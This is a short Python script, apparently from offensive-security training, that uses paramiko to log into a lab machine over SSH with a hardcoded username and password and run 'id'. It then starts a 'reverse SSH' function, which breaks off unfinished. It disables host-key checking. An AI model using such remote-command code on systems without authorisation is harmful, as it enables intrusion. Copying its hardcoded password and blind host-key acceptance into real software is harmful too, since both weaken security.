import threading
import sys
import paramiko
import subprocess

def ssh_command(ip,user,password,command):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=password)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024))
    return 
ssh_command('192.168.100.131','justin','lovepython','id')

#Reverse SSH (for window devices)
def ssh_command_reverse(ip,user,passw,command):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
